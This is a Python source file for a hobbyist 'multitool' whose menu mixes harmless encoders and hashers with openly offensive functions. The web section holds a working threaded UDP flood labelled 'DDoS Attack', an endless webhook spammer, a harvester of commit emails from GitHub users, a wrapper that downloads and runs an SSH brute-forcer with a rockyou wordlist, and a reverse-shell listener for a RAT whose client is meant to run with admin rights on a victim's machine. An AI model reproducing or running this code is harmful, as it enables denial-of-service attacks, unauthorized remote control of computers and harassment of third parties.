# Copyright 2024 YureiNox
#
# Licensed under the Apache License, Version 2.0 (the "License");
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at
#
#     http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an "AS IS" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
# limitations under the License.

import os
import sys
import math
from time import sleep
from Tools.internetconnection import check_internet
from Tools.depedeciesChecker.requestsdep import check_dependencies_requests as check_requests
from Tools.depedeciesChecker.pyperclipdep import check_dependencies_pyperclip as check_pyperclip
from Tools.versionchecker import get_latest_version

JAUNE = "\033[33m"
ROUGE = "\033[31m"
VERT = "\033[32m"
VIOLET = "\033[35m"  
RESET = "\033[0m" 

def getcurrentversion():
    with open(os.path.join(os.path.dirname(__file__), 'version.json')) as f:
        return json.load(f)['version']

def check_v():
    if get_latest_version() == getcurrentversion():
        print(f'{VERT}You are using the latest version of YureiMultitool [{getcurrentversion()}].{RESET}')
        sleep(2.5)
    else:
        if get_latest_version() < getcurrentversion():
            print(f'{VERT}You are using a beta version of YureiMultitool Welcome ![{getcurrentversion()}].{RESET}')
            sleep(2.5)
        else:
            print(f'{ROUGE}A new version of YureiMultitool is available. Please update to the latest version.{RESET}')
            sys.exit(1)

url_pico = 'https://github.com/wasdwasd0105/PicoW-usb2bt-audio/releases/download/V0.5.1/PicoW_USB_BT_Audio.0.5.1.uf2'
filename_pico = 'PicoW_USB_BT_Audio.0.5.1.uf2'

os.system('cls' if os.name == 'nt' else 'clear')

if not check_internet():
    print(f"{ROUGE}No internet connection detected.{RESET}")
    sleep(1)
    exit(1)
else:
    print(f"{JAUNE}Checking Dependencies...{RESET}")
    sleep(1)
    check_pyperclip()
    print(f"{VERT}Pyperclip Found !{RESET}")
    sleep(0.5)
    check_requests()
    print(f"{VERT}Requests Found !{RESET}")
    sleep(0.5)

import requests
import pyperclip
import time
import json
import random
import string
import threading
import socket
import base64
import hashlib
import urllib.parse
import shutil
from zipfile import ZipFile 
import threading
import signal

ascii_art = r""" 
  ___    ___ ___  ___  ________  _______   ___  _________  ________  ________  ___       ________      
 |\  \  /  /|\  \|\  \|\   __  \|\  ___ \ |\  \|\___   ___\\   __  \|\   __  \|\  \     |\   ____\     
 \ \  \/  / | \  \\\  \ \  \|\  \ \   __/|\ \  \|___ \  \_\ \  \|\  \ \  \|\  \ \  \    \ \  \___|_    
  \ \    / / \ \  \\\  \ \   _  _\ \  \_|/_\ \  \   \ \  \ \ \  \\\  \ \  \\\  \ \  \    \ \_____  \   
   \/  /  /   \ \  \\\  \ \  \\  \\ \  \_|\ \ \  \   \ \  \ \ \  \\\  \ \  \\\  \ \  \____\|____|\  \  
 __/  / /      \ \_______\ \__\\ _\\ \_______\ \__\   \ \__\ \ \_______\ \_______\ \_______\____\_\  \ 
|\___/ /        \|_______|\|__|\|__|\|_______|\|__|    \|__|  \|_______|\|_______|\|_______|\_________\
\|___|/                                                                                    \|_________| 
by YureiNox --> https://github.com/yudaol"""

log_file_path = "app.log"  
os.system('cls' if os.name == 'nt' else 'clear')
def log_message(message):
    """Enregistre un message dans le fichier de log."""
    with open(log_file_path, "a") as log_file:
        log_file.write(f"{time.strftime('%Y-%m-%d %H:%M:%S')} - {message}\n")

def main():
    os.system('cls' if os.name == 'nt' else 'clear')
    print(VIOLET + ascii_art + RESET)
    if not check_internet():
        print(f'{RESET}Internet connection status: {ROUGE}Not Connected!{RESET}')
    else:
        print(f'{RESET}Internet connection status: {VERT}Connected !{RESET}')
    print(''' 
    [1] Tools 
    [2] Web 
    [3] Save Log
    [4] Exit''')

    choice = input('\nSelect an option: ')

    if choice == '1':
        os.system('cls' if os.name == 'nt' else 'clear')
        TOOLS()
    elif choice == '2':
        os.system('cls' if os.name == 'nt' else 'clear')
        WEB()
    elif choice == '3':
        save_log()
    elif choice == '4':
        os.system('cls' if os.name == 'nt' else 'clear')
        print('Exiting...')
        sys.exit()

def save_log():
    """Sauvegarde les logs dans un fichier."""
    message = input("Enter the message to log: ")
    log_message(message)
    print(f"Message logged: {message}")
    input("Press Enter to exit...")
    os.system('cls' if os.name == 'nt' else 'clear')  

def TOOLS():
    while True: 
        print(VIOLET + ascii_art + RESET)
        if not check_internet():
            print(f'{RESET}Internet connection status: {ROUGE}Not Connected!{RESET}')
        else:
            print(f'{RESET}Internet connection status: {VERT}Connected !{RESET}') 
        print(''' 
        [1] Base64 Encoder 
        [2] Base64 Decoder 
        [3] Hasher (MD5, SHA-1, SHA-256) 
        [4] URL Encoder 
        [5] URL Decoder 
        [6] String Generator 
        [7] String Reverser 
        [8] PicoW USB Bluetooth Installer
        [9] Kali Tools Installer [./tools.py]
        [0] Back 
        ''')

        choice = input('Select a tool: ')

        if choice == '1':
            text = input('Enter text to encode in Base64: ')
            encoded = base64.b64encode(text.encode()).decode()
            print(f'Encoded text: {encoded}')
            pyperclip.copy(encoded)  
            print('Encoded text copied to clipboard.')
            log_message(f"Encoded text: {encoded}")  
            input("Press Enter to return to the main menu...")
            os.system('cls' if os.name == 'nt' else 'clear')  

        elif choice == '2':
            encoded_text = input('Enter Base64 text to decode: ')
            try:
                decoded = base64.b64decode(encoded_text).decode()
                print(f'Decoded text: {decoded}')
                pyperclip.copy(decoded)  
                print('Decoded text copied to clipboard.')
                log_message(f"Decoded text: {decoded}")  
            except Exception as e:
                print(f'Error decoding: {e}')
                log_message(f'Error decoding: {e}')  
            input("Press Enter to return to the main menu...")
            os.system('cls' if os.name == 'nt' else 'clear')  

        elif choice == '3':
            text = input('Enter text to hash: ')
            print('Choose hashing algorithm:')
            print('[1] MD5\n[2] SHA-1\n[3] SHA-256')
            hash_choice = input('Select an option: ')

            if hash_choice == '1':
                result = hashlib.md5(text.encode()).hexdigest()
            elif hash_choice == '2':
                result = hashlib.sha1(text.encode()).hexdigest()
            elif hash_choice == '3':
                result = hashlib.sha256(text.encode()).hexdigest()
            else:
                print('Invalid choice.')
                continue
            
            print(f'Hashed text: {result}')
            pyperclip.copy(result)  
            print('Hashed text copied to clipboard.')
            log_message(f'Hashed text: {result}')  
            input("Press Enter to return to the main menu...")
            os.system('cls' if os.name == 'nt' else 'clear')  

        elif choice == '4':
            url = input('Enter URL to encode: ')
            encoded_url = urllib.parse.quote(url)
            print(f'Encoded URL: {encoded_url}')
            pyperclip.copy(encoded_url)  
            print('Encoded URL copied to clipboard.')
            log_message(f'Encoded URL: {encoded_url}')  
            input("Press Enter to return to the main menu...")
            os.system('cls' if os.name == 'nt' else 'clear')  

        elif choice == '5':
            url = input('Enter URL to decode: ')
            decoded_url = urllib.parse.unquote(url)
            print(f'Decoded URL: {decoded_url}')
            pyperclip.copy(decoded_url)  
            print('Decoded URL copied to clipboard.')
            log_message(f'Decoded URL: {decoded_url}')  
            input("Press Enter to return to the main menu...")
            os.system('cls' if os.name == 'nt' else 'clear')  

        elif choice == '6':
            length = int(input('Enter the length of the random string: '))
            characters = string.ascii_letters + string.digits
            random_string = ''.join(random.choice(characters) for i in range(length))
            print(f'Generated string: {random_string}')
            pyperclip.copy(random_string)  
            print('Generated string copied to clipboard.')
            log_message(f'Generated string: {random_string}')  
            input("Press Enter to return to the main menu...")
            os.system('cls' if os.name == 'nt' else 'clear')  

        elif choice == '7':
            text = input('Enter text to reverse: ')
            reversed_text = text[::-1]
            print(f'Reversed text: {reversed_text}')
            pyperclip.copy(reversed_text)  
            print('Reversed text copied to clipboard.')
            log_message(f'Reversed text: {reversed_text}')  
            input("Press Enter to return to the main menu...")
            os.system('cls' if os.name == 'nt' else 'clear')  

        elif choice == '8':
            os.system('cls' if os.name == 'nt' else 'clear')
            pico_installation()
        
        elif choice == '9':
            os.system('cls' if os.name == 'nt' else 'clear')
            os.system('python tools.py')
            input("Press Enter to return to the main menu...")
            os.system('cls' if os.name == 'nt' else 'clear')
        
        elif choice == '0':
            os.system('cls' if os.name == 'nt' else 'clear')
            main()
            break
        else:
            print('Invalid choice, please try again.')

def WEB():
    while True:  
        print(VIOLET + ascii_art + RESET)
        if not check_internet():
            print(f'{RESET}Internet connection status: {ROUGE}Not Connected!{RESET}')
        else:
            print(f'{RESET}Internet connection status: {VERT}Connected !{RESET}')
        print(''' 
        [1] IP Lookup 
        [2] Port Scanner 
        [3] DDoS Attack 
        [4] Webhook Spammer 
        [5] Proxy Scraper 
        [6] Proxy Checker 
        [7] Proxy Scraper & Checker 
        [8] Proxy Checker & Scraper 
        [9] Proxy Checker & Scraper (Multithreaded) 
        [10] Proxy Scraper (Multithreaded) 
        [11] Proxy Checker (Multithreaded) 
        [12] Proxy Scraper & Checker (Multithreaded) 
        [13] Email Github Catcher
        [14] Secure shell SSH Bruteforcer
        [15] Reverse Shell HandMain MAY NOT WORK !
        [16] Back''')

        choice = input('\nSelect an option: ')

        if choice == '1':
            iplookup()
        elif choice == '2':
            portscan()
        elif choice == '3':
            ddos()
        elif choice == '4':
            webhookspammer()
        elif choice == '5':
            proxyscraper()
        elif choice == '6':
            proxychecker()
        elif choice == '7':
            proxyscraperandchecker()
        elif choice == '8':
            proxycheckerandscraper()
        elif choice == '9':
            proxycheckerandscrapermt()
        elif choice == '10':
            proxyscrapermt()
        elif choice == '11':
            proxycheckermt()
        elif choice == '12':
            proxycheckerandscrapermt()
        elif choice == '13':
            emailgithubcatcher()
        elif choice == '14':
            ssb()
        elif choice == '15':
            os.system('cls' if os.name == 'nt' else 'clear')
            instruction()
        elif choice == '16':
            os.system('cls' if os.name == 'nt' else 'clear')
            main()
            return  
        else:
            print('Invalid choice. Please try again.')
    
def iplookup():
    ip = input('Enter an IP address to look up: ')
    response = requests.get(f'http://ip-api.com/json/{ip}')
    data = response.json()
    print(json.dumps(data, indent=4))
    input("Press Enter to return to the main menu...")
    os.system('cls' if os.name == 'nt' else 'clear')  

def portscan():
    ip = input('Enter IP address to scan: ')
    start_port = int(input('Enter start port: '))
    end_port = int(input('Enter end port: '))
    
    print(f'Scanning ports {start_port} to {end_port} on {ip}...')
    for port in range(start_port, end_port + 1):
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        socket.setdefaulttimeout(1)
        result = s.connect_ex((ip, port))
        if result == 0:
            print(f'Port {port} is open')
        s.close()
    
    input("Press Enter to return to the main menu...")
    os.system('cls' if os.name == 'nt' else 'clear')  

def ddos():
    ip = input('Enter the target IP address: ')
    port = int(input('Enter the target port: '))
    threads = int(input('Enter number of threads: '))

    def attack():
        while True:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect((ip, port))
            s.sendto(os.urandom(1024), (ip, port))
            print(f'Sent packet to {ip}:{port}')

    for i in range(threads):
        t = threading.Thread(target=attack)
        t.start()

    input("Press Enter to return to the main menu...") 
    os.system('cls' if os.name == 'nt' else 'clear') 

def webhookspammer():
    url = input('Enter your webhook URL: ')
    message = input('Enter your message: ')
    while True:
        requests.post(url, json={"content": message})
        print('Message sent.')

def proxyscraper():
    url = 'https://api.proxyscrape.com/?request=getproxies&proxytype=http&timeout=10000&country=all&ssl=all&anonymity=all'
    response = requests.get(url)
    proxies = response.text

    with open('proxies.txt', 'w') as f:
        f.write(proxies)

    print('Proxies saved to proxies.txt')
    input("Press Enter to return to the main menu...")  
    os.system('cls' if os.name == 'nt' else 'clear')

def proxychecker():
    proxies = open('proxies.txt', 'r').readlines()
    url = 'https://httpbin.org/ip'

    for proxy in proxies:
        proxy = proxy.strip()
        proxy_dict = {'http': f'http://{proxy}', 'https': f'https://{proxy}'}

        try:
            response = requests.get(url, proxies=proxy_dict, timeout=5)
            print(f'{proxy} is working')
        except:
            print(f'{proxy} is not working')
    
    input("Press Enter to return to the main menu...")  
    os.system('cls' if os.name == 'nt' else 'clear')

def proxyscraperandchecker():
    url = 'https://api.proxyscrape.com/?request=getproxies&proxytype=http&timeout=10000&country=all&ssl=all&anonymity=all'
    response = requests.get(url)
    proxies = response.text

    with open('proxies.txt', 'w') as f:
        f.write(proxies)

    print('Proxies saved to proxies.txt')

    proxies = open('proxies.txt', 'r').readlines()
    url = 'https://httpbin.org/ip'

    for proxy in proxies:
        proxy = proxy.strip()
        proxy_dict = {'http': f'http://{proxy}', 'https': f'https://{proxy}'}

        try:
            response = requests.get(url, proxies=proxy_dict, timeout=5)
            print(f'{proxy} is working')
        except:
            print(f'{proxy} is not working')

    input("Press Enter to return to the main menu...")  
    os.system('cls' if os.name == 'nt' else 'clear')

def proxycheckerandscraper():
    proxies = open('proxies.txt', 'r').readlines()
    url = 'https://httpbin.org/ip'

    for proxy in proxies:
        proxy = proxy.strip()
        proxy_dict = {'http': f'http://{proxy}', 'https': f'https://{proxy}'}

        try:
            response = requests.get(url, proxies=proxy_dict, timeout=5)
            print(f'{proxy} is working')
        except:
            print(f'{proxy} is not working')

    url = 'https://api.proxyscrape.com/?request=getproxies&proxytype=http&timeout=10000&country=all&ssl=all&anonymity=all'
    response = requests.get(url)
    proxies = response.text

    with open('proxies.txt', 'w') as f:
        f.write(proxies)

    print('Proxies saved to proxies.txt')
    input("Press Enter to return to the main menu...")
    os.system('cls' if os.name == 'nt' else 'clear')  

def proxycheckerandscrapermt():
    proxies = open('proxies.txt', 'r').readlines()
    url = 'https://httpbin.org/ip'

    def check(proxy):
        proxy = proxy.strip()
        proxy_dict = {'http': f'http://{proxy}', 'https': f'https://{proxy}'}

        try:
            response = requests.get(url, proxies=proxy_dict, timeout=5)
            print(f'{proxy} is working')
        except:
            print(f'{proxy} is not working')

    for proxy in proxies:
        threading.Thread(target=check, args=(proxy,)).start()

    url = 'https://api.proxyscrape.com/?request=getproxies&proxytype=http&timeout=10000&country=all&ssl=all&anonymity=all'
    response = requests.get(url)
    proxies = response.text

    with open('proxies.txt', 'w') as f:
        f.write(proxies)

    print('Proxies saved to proxies.txt')
    input("Press Enter to return to the main menu...")
    os.system('cls' if os.name == 'nt' else 'clear')  

def proxyscrapermt():
    url = 'https://api.proxyscrape.com/?request=getproxies&proxytype=http&timeout=10000&country=all&ssl=all&anonymity=all'
    response = requests.get(url)
    proxies = response.text

    with open('proxies.txt', 'w') as f:
        f.write(proxies)

    print('Proxies saved to proxies.txt')

    proxies = open('proxies.txt', 'r').readlines()
    url = 'https://httpbin.org/ip'

    def check(proxy):
        proxy = proxy.strip()
        proxy_dict = {'http': f'http://{proxy}', 'https': f'https://{proxy}'}

        try:
            response = requests.get(url, proxies=proxy_dict, timeout=5)
            print(f'{proxy} is working')
        except:
            print(f'{proxy} is not working')

    for proxy in proxies:
        threading.Thread(target=check, args=(proxy,)).start()

    input("Press Enter to return to the main menu...")  
    os.system('cls' if os.name == 'nt' else 'clear')

def proxycheckermt():
    proxies = open('proxies.txt', 'r').readlines()
    url = 'https://httpbin.org/ip'

    def check(proxy):
        proxy = proxy.strip()
        proxy_dict = {'http': f'http://{proxy}', 'https': f'https://{proxy}'}

        try:
            response = requests.get(url, proxies=proxy_dict, timeout=5)
            print(f'{proxy} is working')
        except:
            print(f'{proxy} is not working')

    for proxy in proxies:
        threading.Thread(target=check, args=(proxy,)).start()

    input("Press Enter to return to the main menu...") 
    os.system('cls' if os.name == 'nt' else 'clear') 

def emailgithubcatcher():
    lka = input('Enter account pseudo: ')
    api_url_base = f"https://api.github.com/users/{lka}/events/public"

    response = requests.get(api_url_base)
    if response.status_code == 200:
        data = response.json()
        emails = []
       
        for event in data:
            if 'payload' in event and 'commits' in event['payload']:
                for commit in event['payload']['commits']:
                    if 'author' in commit and 'email' in commit['author']:
                        emails.append(commit['author']['email'])
       
        if emails:
            print("Emails trouvés :")
            for email in set(emails):  
                print(email)
        else:
            print("Aucun email trouvé.")
    else:
        print('Error fetching data')

    input("Press Enter to return to the main menu...")
    os.system('cls' if os.name == 'nt' else 'clear')

def download_file_pico(url_pico, filename_pico):
    with open(filename_pico, 'wb') as f:
        response = requests.get(url_pico, stream=True)
        f.write(response.content)

def mediacheck():
    if os.path.exists('C:/Users/pl48gua'):
        
        print('Pico W is plugged in')
        sleep(1)
        print('Installing the program...')
        shutil.move(filename_pico, 'C:/Users/pl48gua')
        sleep(1)
        print('File moved to Pico W')
        sleep(0.5)
        print('Installation done!')
    else:
        print('Pico W is not plugged in yet. Hold the bootsell button and plug it in')
        sleep(2)
        input('Press enter to continue...')
        mediacheck()

def pico_installation():
    h = input('Do you wanna install the program on the pico W ? y/n: ')
    if h == 'y':
        download_file_pico(url_pico, filename_pico)
        print("Pls plug your pico w in while holding bootsel button...")
        input('Press enter to continue...')
        sleep(2)
        mediacheck()
        input("Press Enter to return to the main menu...")
        os.system('cls' if os.name == 'nt' else 'clear')

def ssb_install():
    url_link = "https://github.com/pwnesia/ssb/releases/download/v0.1.1/ssb_0.1.1_windows_amd64.zip"
    file_name = "ssb_0.1.1_windows_amd64.zip"
    directory = "ssb"
    print("SSB is not installed, installing it....")
    with open(file_name, 'wb') as fil:
        response = requests.get(url_link, stream=True)
        fil.write(response.content)
    os.system("mkdir ssb")
    with ZipFile(file_name, 'r') as zipssb: 
        zipssb.extractall( path=f"{directory}")
    os.system(f"del {file_name}")
    if os.path.exists("ssb/ssb.exe"):
        os.system('cls' if os.name == 'nt' else 'clear')
        ssb()
    else:
        os.system('cls' if os.name == 'nt' else 'clear')
        ssb_install()

def ssb():
    url_link = "https://github.com/pwnesia/ssb/releases/download/v0.1.1/ssb_0.1.1_windows_amd64.zip"
    file_name = "ssb_0.1.1_windows_amd64.zip"
    directory = "ssb"
    
    if os.path.exists(directory):
        print("ssb is installed!")

        port = input("Enter PORT [Default = 22]: ")

        if not port:
            port = 22
        else:
            port = int(port)

        wordlist = input("Enter Wordlists [Default = wordlist/rockyou.txt]: ")

        if not wordlist:
            wordlist = "wordlist/rockyou.txt"
       
        timeout = input("Enter timeout [Default = 30s]: ")

        if not timeout:
            timeout = "30"
        
        concurrent = input("Enter concurrent [Default = 100]: ")

        if not concurrent:
            concurrent = "100"
        else:
            concurrent = int(concurrent)

        retries = input("Enter retries [Default = 1]: ")

        if not retries:
            retries = 1
        else:
            retries = int(retries)

        output = input("Enter output file [Default = ssb/output.txt]: ")

        if not output:
            output = "ssb/output.txt"

        ipadd = input("Enter IP address: ")

        if not ipadd:
            ipadd = "localhost"
        else:
            ipadd = int(ipadd)

        usernamed = input("Enter USER: ")

        if not usernamed:
            usernamed = "admin"
        else:
            usernamed = int(usernamed)

        verbose = input("Do you want verbose mode? y/n: ")

        if verbose == 'y':
            os.system(f"ssb\\ssb.exe -p {port} -w {wordlist} -t {timeout} -c {concurrent} -r {retries} -o {output} -v {usernamed}@{ipadd}")
        else:
            os.system(f"ssb\\ssb.exe -p {port} -w {wordlist} -t {timeout} -c {concurrent} -r {retries} -o {output} {usernamed}@{ipadd}")
        
        input("Press enter to return to the main menu...")
        os.system('cls' if os.name == 'nt' else 'clear')
    
    else:
        ssb_install()       

HOST = '0.0.0.0'  
PORT = 8800  

clients = []  

def shell(client_socket, address):
    """ Gère la session shell pour un client donné """
    print(f"[+] Client connecté: {address}")

    while True:
        try:
            current_dir = client_socket.recv(1024).decode()
            if not current_dir:
                break  
            print(current_dir, end='')  
            
            command = input()  

            if command.lower() == 'exit':
                client_socket.send(command.encode())
                print("Fermeture de la connexion avec le client.")
                break

            client_socket.send(command.encode())

            output = client_socket.recv(4096).decode()
            print(output.strip(), end='\n')  
  
        except Exception as e:
            print(f"Erreur lors de la communication avec le client : {e}")
            break

    client_socket.close()

def start_server():
    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server_socket.bind((HOST, PORT))
    server_socket.listen(5)
    print(f"[*] Serveur démarré sur {HOST}:{PORT}")

    while True:
        client_socket, address = server_socket.accept()
        clients.append(client_socket)
        client_thread = threading.Thread(target=shell, args=(client_socket, address))
        client_thread.start()

def handle_interrupt(signal, frame):
    """ Gère l'interruption Ctrl+C en arrêtant le serveur proprement """
    print("\n[!] Arrêt du serveur demandé.")
    for client_socket in clients:
        client_socket.close()  
    sys.exit(0)

def instruction():
    input("Press enter after each slide! And now!")
    input("1- download server.py from github on github.com/yureinox/RAT")
    input("2- Execute using sudo or with admin for admin privilege in SHELL in the client pc or mac")
    input("Press enter to continue to server side loading...")
    os.system('cls' if os.name == 'nt' else 'clear')
    start_server()

if __name__ == "__main__":
    print(f"{VIOLET}YureiMultitool {getcurrentversion()}{RESET}")
    sleep(1)
    print(f"{JAUNE}Checking for updates...{RESET}")
    sleep(1)
    check_v()
    main()